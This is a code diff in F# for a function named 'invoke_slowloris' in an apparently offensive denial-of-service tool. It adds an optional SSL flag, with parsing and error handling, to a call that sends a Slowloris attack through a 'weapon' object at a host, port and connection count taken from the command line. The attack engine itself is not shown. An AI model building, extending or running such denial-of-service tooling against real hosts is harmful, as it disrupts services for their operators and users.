@@ -13,12 +13,26 @@ module sultan =
 
     let E : string = string (char 0x1B)
     let invoke_slowloris (args : string[]) =
+        let mutable usessl : bool = false
         if args.Length < 2 then
                 errorfn "100 Target host not provided. Aborting."
                 exit 1
-                else verbose "starting...\n"
+                else verbose "starting..."
+        try
+            usessl <- System.Boolean.Parse(args.[4])
+            ()
+        with
+            | :? ArgumentException as err ->
+                warn "101 useSSL parameter is null, defaulting to FALSE"
+                ()
+            | :? IndexOutOfRangeException as err ->
+                warn "101 useSSL parameter is null, defaulting to FALSE"
+                ()
+            | :? FormatException as err ->
+                warn "102 useSSL parameter was not in the correct format, defaulting to FALSE"
+                ()
         let weapon = new sllib()
-        weapon.attack(args.[1], System.Int32.Parse(args.[2]), false, System.Int32.Parse(args.[3]));
+        weapon.attack(args.[1], System.Int32.Parse(args.[2]), usessl, System.Int32.Parse(args.[3]));
         Thread.Sleep(Timeout.Infinite);
         0
 
